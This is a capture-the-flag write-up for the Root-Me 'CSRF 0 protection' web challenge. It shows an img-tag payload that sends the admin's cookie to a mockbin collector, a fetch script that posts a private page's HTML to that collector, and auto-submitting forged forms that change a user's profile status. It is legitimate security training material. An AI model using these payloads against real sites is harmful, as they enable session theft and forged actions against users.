# CSRF 0 protection

## Initial attempt

Submit the following in the contact section since that's the only way to communicate our exploits to the admin

```javascript
<img src="https://b5e02d613ca44b7384e0290125a1448e.api.mockbin.io/" + document.cookie />
```

Problem: we do not recieve any cookie on the mock bin, indicating maybe the admin is using a different interface to check contact logs.

## Forms

```javascript
<form name="badform" method="post" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile">
    <input type="hidden" name="username" value="shawn">
    <input type="hidden" name="status" value="private">
</form>

<script>document.badform.submit()</script>
```

```javascript
var p = await fetch("http://challenge01.root-me.org/web-client/ch22/index.php?action=private")
    .then(async function(response){ 
        var t = await response.text();
        var r = await fetch("https://b5e02d613ca44b7384e0290125a1448e.api.mockbin.io/", {
            method: "POST",
            body: JSON.stringify({ html: t }),
        });
    });
```

Problem: no request is recieved on the mockbin

## Solution

```javascript
<form  name="badform" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
    <input type="text" name="username" value="shawn" />
    <input type="checkbox" name="status" checked=checked />
    <input type="submit" value="Submit request" />
</form>
<script>document.badform.submit()</script>
```
